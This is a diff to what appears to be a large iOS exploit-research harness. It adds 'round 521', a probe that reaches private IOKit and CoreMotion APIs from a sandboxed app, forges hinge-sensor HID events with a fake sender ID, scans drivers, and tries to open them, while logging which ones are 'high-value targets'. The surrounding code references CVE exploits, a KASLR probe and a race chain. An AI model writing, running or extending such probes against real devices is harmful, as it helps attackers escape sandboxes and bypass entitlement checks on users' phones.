@@ -32546,6 +32546,451 @@ static void r520_credential_patch(void) {
     rlog("\n=== Round 520 complete ===\n");
 }
 
+/* ===================================================================
+ * Round 521: IOHIDEventSystem Hinge Event Injection Probe
+ *
+ * Tests whether a sandboxed app can:
+ * 1. Create an IOHIDEventSystemClient (requires entitlement check)
+ * 2. Enumerate IOHIDServices for hinge-related sensors
+ * 3. Dispatch synthetic hinge events (angle changes)
+ * 4. Observe camera/display pipeline reactions to fake hinge events
+ *
+ * Attack surface: New iOS 27.1 code path for iPhone Duo hinge sensor.
+ * Path: IOHIDDevice (kernel) → IOHIDEventSystem → CMAngleManager → UIKit
+ * If event injection works without entitlement → state confusion primitive.
+ * =================================================================== */
+
+static void r521_hinge_probe(void) {
+    rlog("=== Round 521: IOHIDEventSystem Hinge Event Injection Probe ===\n");
+    rlog("Target: iPhone Duo (A20 Pro) iOS 27.1 hinge sensor path\n\n");
+
+    /* Phase 1: Resolve IOHIDEventSystem symbols via dlsym */
+    rlog("--- Phase 1: Symbol resolution ---\n");
+
+    void *iohid_handle = dlopen("/System/Library/Frameworks/IOKit.framework/IOKit", RTLD_NOW);
+    if (!iohid_handle) {
+        rlog("  IOKit.framework dlopen FAILED: %s\n", dlerror());
+        rlog("  Trying alternate path...\n");
+        iohid_handle = dlopen("/System/Library/PrivateFrameworks/IOKit.framework/IOKit", RTLD_NOW);
+    }
+
+    /* IOHIDEventSystemClient functions */
+    typedef void* IOHIDEventSystemClientRef;
+    typedef void* IOHIDServiceClientRef;
+    typedef void* IOHIDEventRef;
+
+    IOHIDEventSystemClientRef (*p_IOHIDEventSystemClientCreate)(CFAllocatorRef) =
+        (IOHIDEventSystemClientRef(*)(CFAllocatorRef))dlsym(RTLD_DEFAULT,
+            "IOHIDEventSystemClientCreate");
+    IOHIDEventSystemClientRef (*p_IOHIDEventSystemClientCreateSimpleClient)(CFAllocatorRef) =
+        (IOHIDEventSystemClientRef(*)(CFAllocatorRef))dlsym(RTLD_DEFAULT,
+            "IOHIDEventSystemClientCreateSimpleClient");
+
+    CFArrayRef (*p_IOHIDEventSystemClientCopyServices)(IOHIDEventSystemClientRef) =
+        (CFArrayRef(*)(IOHIDEventSystemClientRef))dlsym(RTLD_DEFAULT,
+            "IOHIDEventSystemClientCopyServices");
+
+    /* IOHIDServiceClient property access */
+    CFTypeRef (*p_IOHIDServiceClientCopyProperty)(IOHIDServiceClientRef, CFStringRef) =
+        (CFTypeRef(*)(IOHIDServiceClientRef, CFStringRef))dlsym(RTLD_DEFAULT,
+            "IOHIDServiceClientCopyProperty");
+
+    /* IOHIDEvent creation */
+    IOHIDEventRef (*p_IOHIDEventCreateVendorDefinedEvent)(
+        CFAllocatorRef, uint64_t, uint32_t, uint32_t,
+        const uint8_t *, CFIndex) =
+        (IOHIDEventRef(*)(CFAllocatorRef, uint64_t, uint32_t, uint32_t,
+            const uint8_t *, CFIndex))dlsym(RTLD_DEFAULT,
+            "IOHIDEventCreateVendorDefinedEvent");
+
+    /* IOHIDEvent dispatch */
+    void (*p_IOHIDEventSystemClientDispatchEvent)(IOHIDEventSystemClientRef, IOHIDEventRef) =
+        (void(*)(IOHIDEventSystemClientRef, IOHIDEventRef))dlsym(RTLD_DEFAULT,
+            "IOHIDEventSystemClientDispatchEvent");
+
+    /* IOHIDEvent properties */
+    void (*p_IOHIDEventSetSenderID)(IOHIDEventRef, uint64_t) =
+        (void(*)(IOHIDEventRef, uint64_t))dlsym(RTLD_DEFAULT,
+            "IOHIDEventSetSenderID");
+
+    rlog("  IOHIDEventSystemClientCreate: %s\n",
+         p_IOHIDEventSystemClientCreate ? "FOUND" : "NOT FOUND");
+    rlog("  IOHIDEventSystemClientCreateSimpleClient: %s\n",
+         p_IOHIDEventSystemClientCreateSimpleClient ? "FOUND" : "NOT FOUND");
+    rlog("  IOHIDEventSystemClientCopyServices: %s\n",
+         p_IOHIDEventSystemClientCopyServices ? "FOUND" : "NOT FOUND");
+    rlog("  IOHIDServiceClientCopyProperty: %s\n",
+         p_IOHIDServiceClientCopyProperty ? "FOUND" : "NOT FOUND");
+    rlog("  IOHIDEventCreateVendorDefinedEvent: %s\n",
+         p_IOHIDEventCreateVendorDefinedEvent ? "FOUND" : "NOT FOUND");
+    rlog("  IOHIDEventSystemClientDispatchEvent: %s\n",
+         p_IOHIDEventSystemClientDispatchEvent ? "FOUND" : "NOT FOUND");
+    rlog("  IOHIDEventSetSenderID: %s\n",
+         p_IOHIDEventSetSenderID ? "FOUND" : "NOT FOUND");
+
+    /* Phase 2: Try creating IOHIDEventSystemClient */
+    rlog("\n--- Phase 2: IOHIDEventSystemClient creation ---\n");
+    rlog("  This tests entitlement enforcement on hinge event path\n");
+
+    IOHIDEventSystemClientRef client = NULL;
+
+    /* Try full client first (usually requires com.apple.hid.system.user-access-service) */
+    if (p_IOHIDEventSystemClientCreate) {
+        rlog("  Trying IOHIDEventSystemClientCreate...\n");
+        client = p_IOHIDEventSystemClientCreate(kCFAllocatorDefault);
+        if (client) {
+            rlog("  FULL CLIENT CREATED — entitlement check may be MISSING!\n");
+            rlog("  This is a significant finding — full HID access from sandbox\n");
+        } else {
+            rlog("  Full client creation DENIED (expected — entitlement required)\n");
+        }
+    }
+
+    /* Try simple client (lower privilege, may not need entitlement) */
+    if (!client && p_IOHIDEventSystemClientCreateSimpleClient) {
+        rlog("  Trying IOHIDEventSystemClientCreateSimpleClient...\n");
+        client = p_IOHIDEventSystemClientCreateSimpleClient(kCFAllocatorDefault);
+        if (client) {
+            rlog("  SIMPLE CLIENT CREATED\n");
+            rlog("  Partial access — may be able to enumerate but not inject\n");
+        } else {
+            rlog("  Simple client creation also DENIED\n");
+        }
+    }
+
+    if (!client) {
+        rlog("\n  Both client types denied — IOHIDEventSystem is entitlement-gated\n");
+        rlog("  Hinge event injection NOT possible from sandboxed app\n");
+        rlog("  Fallback: check UIHingeInteraction for race conditions instead\n");
+        goto r521_phase3;
+    }
+
+    /* Phase 2b: Enumerate services for hinge sensor */
+    rlog("\n--- Phase 2b: Service enumeration ---\n");
+    if (p_IOHIDEventSystemClientCopyServices) {
+        CFArrayRef services = p_IOHIDEventSystemClientCopyServices(client);
+        if (services) {
+            CFIndex count = CFArrayGetCount(services);
+            rlog("  Found %ld IOHIDServiceClients\n", (long)count);
+
+            for (CFIndex i = 0; i < count && i < 50; i++) {
+                IOHIDServiceClientRef svc = (IOHIDServiceClientRef)CFArrayGetValueAtIndex(services, i);
+                if (!svc) continue;
+
+                /* Get Product name */
+                CFStringRef product = NULL;
+                if (p_IOHIDServiceClientCopyProperty) {
+                    product = (CFStringRef)p_IOHIDServiceClientCopyProperty(svc,
+                        CFSTR("Product"));
+                }
+
+                /* Get Usage Page and Usage */
+                CFNumberRef usagePage = NULL, usage = NULL;
+                if (p_IOHIDServiceClientCopyProperty) {
+                    usagePage = (CFNumberRef)p_IOHIDServiceClientCopyProperty(svc,
+                        CFSTR("PrimaryUsagePage"));
+                    usage = (CFNumberRef)p_IOHIDServiceClientCopyProperty(svc,
+                        CFSTR("PrimaryUsage"));
+                }
+
+                int uPage = 0, uUsage = 0;
+                if (usagePage) CFNumberGetValue(usagePage, kCFNumberIntType, &uPage);
+                if (usage) CFNumberGetValue(usage, kCFNumberIntType, &uUsage);
+
+                char name_buf[256] = "unknown";
+                if (product && CFGetTypeID(product) == CFStringGetTypeID()) {
+                    CFStringGetCString(product, name_buf, sizeof(name_buf),
+                        kCFStringEncodingUTF8);
+                }
+
+                /* Look for hinge-related services */
+                int is_hinge = 0;
+                if (strstr(name_buf, "inge") || strstr(name_buf, "ngle") ||
+                    strstr(name_buf, "old") || strstr(name_buf, "lex") ||
+                    uPage == 0xFF00 || /* Vendor-defined page */
+                    uPage == 0x20) {   /* Sensor page */
+                    is_hinge = 1;
+                }
+
+                rlog("  [%ld] Product='%s' UsagePage=0x%04X Usage=0x%04X%s\n",
+                     (long)i, name_buf, uPage, uUsage,
+                     is_hinge ? " *** HINGE CANDIDATE ***" : "");
+
+                if (product) CFRelease(product);
+                if (usagePage) CFRelease(usagePage);
+                if (usage) CFRelease(usage);
+            }
+            CFRelease(services);
+        } else {
+            rlog("  Service enumeration returned NULL\n");
+        }
+    }
+
+    /* Phase 2c: Try dispatching a synthetic vendor-defined event */
+    rlog("\n--- Phase 2c: Synthetic event dispatch ---\n");
+    if (p_IOHIDEventCreateVendorDefinedEvent && p_IOHIDEventSystemClientDispatchEvent) {
+        /* Create a vendor-defined event mimicking a hinge angle change
+         * Payload format is speculative — based on artemnovichkov/hinge tool.
+         * UsagePage 0xFF00 (vendor), Usage 0x01
+         * Payload: 4 bytes for angle (float, radians) */
+        float test_angle = 1.5708f; /* 90 degrees in radians = partially open */
+        uint8_t payload[8];
+        memcpy(payload, &test_angle, 4);
+        payload[4] = 0x02; /* status: partiallyOpen */
+        payload[5] = 0x00;
+        payload[6] = 0x00;
+        payload[7] = 0x00;
+
+        uint64_t timestamp = mach_absolute_time();
+
+        IOHIDEventRef event = p_IOHIDEventCreateVendorDefinedEvent(
+            kCFAllocatorDefault,
+            timestamp,
+            0xFF00,  /* Vendor-defined usage page */
+            0x01,    /* Usage */
+            payload,
+            sizeof(payload));
+
+        if (event) {
+            rlog("  Vendor event CREATED\n");
+
+            if (p_IOHIDEventSetSenderID) {
+                p_IOHIDEventSetSenderID(event, 0x200000001); /* Fake sender ID */
+                rlog("  Sender ID set to 0x200000001\n");
+            }
+
+            rlog("  Attempting dispatch...\n");
+            p_IOHIDEventSystemClientDispatchEvent(client, event);
+            rlog("  Dispatch returned (no crash)\n");
+            rlog("  CHECK: Did the system react? (display change, camera toggle)\n");
+            rlog("  If yes → HINGE EVENT INJECTION WORKS from sandbox!\n");
+
+            CFRelease(event);
+        } else {
+            rlog("  Vendor event creation FAILED\n");
+        }
+    } else {
+        rlog("  Event creation/dispatch symbols not available\n");
+    }
+
+    if (client) CFRelease(client);
+
+r521_phase3:
+    /* Phase 3: Probe IOKit registry for hinge-related drivers */
+    rlog("\n--- Phase 3: IOKit registry scan for hinge drivers ---\n");
+
+    mach_port_t (*p_IOServiceGetMatchingService)(mach_port_t, CFDictionaryRef) =
+        (mach_port_t(*)(mach_port_t, CFDictionaryRef))dlsym(RTLD_DEFAULT,
+            "IOServiceGetMatchingService");
+    CFMutableDictionaryRef (*p_IOServiceMatching)(const char *) =
+        (CFMutableDictionaryRef(*)(const char *))dlsym(RTLD_DEFAULT,
+            "IOServiceMatching");
+    kern_return_t (*p_IOServiceOpen)(io_service_t, mach_port_t, uint32_t, io_connect_t *) =
+        (kern_return_t(*)(io_service_t, mach_port_t, uint32_t, io_connect_t *))dlsym(RTLD_DEFAULT,
+            "IOServiceOpen");
+    kern_return_t (*p_IOServiceClose)(io_connect_t) =
+        (kern_return_t(*)(io_connect_t))dlsym(RTLD_DEFAULT, "IOServiceClose");
+    kern_return_t (*p_IORegistryEntryCreateCFProperties)(io_registry_entry_t,
+        CFMutableDictionaryRef *, CFAllocatorRef, uint32_t) =
+        (kern_return_t(*)(io_registry_entry_t, CFMutableDictionaryRef *,
+            CFAllocatorRef, uint32_t))dlsym(RTLD_DEFAULT,
+            "IORegistryEntryCreateCFProperties");
+    io_iterator_t iter = 0;
+    kern_return_t (*p_IOServiceGetMatchingServices)(mach_port_t, CFDictionaryRef, io_iterator_t *) =
+        (kern_return_t(*)(mach_port_t, CFDictionaryRef, io_iterator_t *))dlsym(RTLD_DEFAULT,
+            "IOServiceGetMatchingServices");
+    io_object_t (*p_IOIteratorNext)(io_iterator_t) =
+        (io_object_t(*)(io_iterator_t))dlsym(RTLD_DEFAULT, "IOIteratorNext");
+    kern_return_t (*p_IORegistryEntryGetName)(io_registry_entry_t, char *) =
+        (kern_return_t(*)(io_registry_entry_t, char *))dlsym(RTLD_DEFAULT,
+            "IORegistryEntryGetName");
+    kern_return_t (*p_IOObjectRelease)(io_object_t) =
+        (kern_return_t(*)(io_object_t))dlsym(RTLD_DEFAULT, "IOObjectRelease");
+
+    /* Scan for hinge-related driver names */
+    const char *hinge_classes[] = {
+        "IOHIDDevice",
+        "AppleHIDTransportHIDDevice",
+        "AppleMultitouchDevice",
+        "IOHIDEventDriver",
+        "AppleSPU",  /* Sensor Processing Unit */
+        "CMAngleManager", /* CoreMotion private */
+        NULL
+    };
+
+    for (int ci = 0; hinge_classes[ci]; ci++) {
+        if (!p_IOServiceGetMatchingServices || !p_IOServiceMatching ||
+            !p_IOIteratorNext || !p_IORegistryEntryGetName || !p_IOObjectRelease)
+            break;
+
+        CFMutableDictionaryRef match = p_IOServiceMatching(hinge_classes[ci]);
+        if (!match) continue;
+
+        kern_return_t kr = p_IOServiceGetMatchingServices(0, match, &iter);
+        if (kr != KERN_SUCCESS) {
+            rlog("  %s: not found (kr=%d)\n", hinge_classes[ci], kr);
+            continue;
+        }
+
+        io_object_t entry;
+        int found = 0;
+        while ((entry = p_IOIteratorNext(iter)) != 0) {
+            char name[128] = {0};
+            p_IORegistryEntryGetName(entry, name);
+
+            /* Check for hinge-related names */
+            int interesting = (strstr(name, "inge") || strstr(name, "ngle") ||
+                              strstr(name, "old") || strstr(name, "ensor") ||
+                              strstr(name, "ccel") || strstr(name, "yro"));
+
+            if (interesting || found < 3) {
+                rlog("  %s → '%s'%s\n", hinge_classes[ci], name,
+                     interesting ? " *** HINGE CANDIDATE ***" : "");
+            }
+            found++;
+
+            /* If this looks hinge-related, try to get properties */
+            if (interesting && p_IORegistryEntryCreateCFProperties) {
+                CFMutableDictionaryRef props = NULL;
+                kr = p_IORegistryEntryCreateCFProperties(entry, &props,
+                    kCFAllocatorDefault, 0);
+                if (kr == KERN_SUCCESS && props) {
+                    CFIndex propCount = CFDictionaryGetCount(props);
+                    rlog("    Properties: %ld keys\n", (long)propCount);
+
+                    /* Dump key names (not values — could be large) */
+                    CFIndex count = CFDictionaryGetCount(props);
+                    if (count > 0 && count < 100) {
+                        const void **keys = (const void **)malloc(count * sizeof(void *));
+                        if (keys) {
+                            CFDictionaryGetKeysAndValues(props, keys, NULL);
+                            for (CFIndex k = 0; k < count && k < 20; k++) {
+                                char key_str[256] = {0};
+                                if (CFGetTypeID(keys[k]) == CFStringGetTypeID()) {
+                                    CFStringGetCString((CFStringRef)keys[k], key_str,
+                                        sizeof(key_str), kCFStringEncodingUTF8);
+                                    rlog("    key[%ld]: %s\n", (long)k, key_str);
+                                }
+                            }
+                            free(keys);
+                        }
+                    }
+                    CFRelease(props);
+                }
+            }
+
+            /* Try opening the service to test access */
+            if (interesting && p_IOServiceOpen) {
+                io_connect_t conn = 0;
+                kr = p_IOServiceOpen(entry, mach_task_self(), 0, &conn);
+                rlog("    IOServiceOpen: %s (kr=%d)\n",
+                     kr == KERN_SUCCESS ? "OPEN" : "DENIED", kr);
+                if (kr == KERN_SUCCESS && p_IOServiceClose) {
+                    rlog("    *** DRIVER OPEN FROM SANDBOX — high-value target ***\n");
+                    p_IOServiceClose(conn);
+                }
+            }
+
+            p_IOObjectRelease(entry);
+        }
+        if (found > 3) rlog("  ... and %d more entries\n", found - 3);
+    }
+
+    /* Phase 4: Probe CMAngleManager via CoreMotion private API */
+    rlog("\n--- Phase 4: CoreMotion CMAngleManager probe ---\n");
+
+    void *cm_handle = dlopen("/System/Library/Frameworks/CoreMotion.framework/CoreMotion",
+                             RTLD_NOW);
+    if (!cm_handle) {
+        rlog("  CoreMotion dlopen FAILED: %s\n", dlerror());
+    } else {
+        rlog("  CoreMotion loaded\n");
+
+        /* Try to find CMAngleManager class via Objective-C runtime */
+        Class (*p_objc_getClass)(const char *) =
+            (Class(*)(const char *))dlsym(RTLD_DEFAULT, "objc_getClass");
+        SEL (*p_sel_registerName)(const char *) =
+            (SEL(*)(const char *))dlsym(RTLD_DEFAULT, "sel_registerName");
+        id (*p_objc_msgSend)(id, SEL, ...) =
+            (id(*)(id, SEL, ...))dlsym(RTLD_DEFAULT, "objc_msgSend");
+
+        if (p_objc_getClass && p_sel_registerName && p_objc_msgSend) {
+            /* Check if CMAngleManager class exists */
+            Class cmAngleMgr = p_objc_getClass("CMAngleManager");
+            rlog("  CMAngleManager class: %s\n",
+                 cmAngleMgr ? "EXISTS" : "NOT FOUND");
+
+            if (cmAngleMgr) {
+                /* Try to allocate an instance */
+                SEL allocSel = p_sel_registerName("alloc");
+                SEL initSel = p_sel_registerName("init");
+                SEL sharedSel = p_sel_registerName("sharedManager");
+
+                /* Try shared singleton first */
+                id shared = NULL;
+                @try {
+                    shared = p_objc_msgSend((id)cmAngleMgr, sharedSel);
+                    rlog("  sharedManager: %s\n", shared ? "RETURNED" : "nil");
+                } @catch (id ex) {
+                    rlog("  sharedManager: threw exception (selector may not exist)\n");
+                }
+
+                /* Try alloc/init */
+                if (!shared) {
+                    @try {
+                        id obj = p_objc_msgSend((id)cmAngleMgr, allocSel);
+                        if (obj) {
+                            obj = p_objc_msgSend(obj, initSel);
+                            rlog("  alloc/init: %s\n", obj ? "SUCCESS" : "FAILED");
+                            if (obj) {
+                                rlog("  *** CMAngleManager instantiated from sandbox! ***\n");
+                                /* Try to read angle */
+                                SEL angleSel = p_sel_registerName("currentAngle");
+                                @try {
+                                    /* Cast to get double return value */
+                                    double (*msgSend_d)(id, SEL) =
+                                        (double(*)(id, SEL))dlsym(RTLD_DEFAULT,
+                                            "objc_msgSend");
+                                    double angle = msgSend_d(obj, angleSel);
+                                    rlog("  currentAngle: %f radians\n", angle);
+                                } @catch (id ex) {
+                                    rlog("  currentAngle: threw exception\n");
+                                }
+                            }
+                        }
+                    } @catch (id ex) {
+                        rlog("  alloc/init: threw exception\n");
+                    }
+                }
+            }
+
+            /* Also check for other hinge-related private classes */
+            const char *private_classes[] = {
+                "CMHingeAngleData",
+                "CMFoldState",
+                "CMDevicePosture",
+                "UIHinge",
+                "UIHingeInteraction",
+                "_UIHingeObserver",
+                "_UIDeviceHingeController",
+                NULL
+            };
+
+            rlog("\n  Private class scan:\n");
+            for (int pi = 0; private_classes[pi]; pi++) {
+                Class cls = p_objc_getClass(private_classes[pi]);
+                rlog("  %s: %s\n", private_classes[pi],
+                     cls ? "EXISTS" : "not found");
+            }
+        }
+        dlclose(cm_handle);
+    }
+
+    rlog("\n=== Round 521 complete ===\n");
+    rlog("NEXT: If client creation succeeded, code round 522 (camera pipeline stress)\n");
+    rlog("NEXT: If denied, focus on rounds 516-518 (SPTM race chain)\n");
+}
+
 static void aks_kaslr_probe(void) {
     rlog("=== CVE-2026-65343: AppleKeyStore OOB read → KASLR probe ===\n\n");
 
@@ -103596,6 +104041,12 @@ new_modes:
             rlog("*** rounds=485: CVE-2026-112477 adapted + SurfHeist + property race ***\n\n");
             fflush(stdout);
             r484_exploit();
+            goto done;
+        }
+        if (rounds == 521) {
+            rlog("*** rounds=521: IOHIDEventSystem hinge event injection probe ***\n\n");
+            fflush(stdout);
+            r521_hinge_probe();
             goto done;
         }
         if (rounds == 520) {
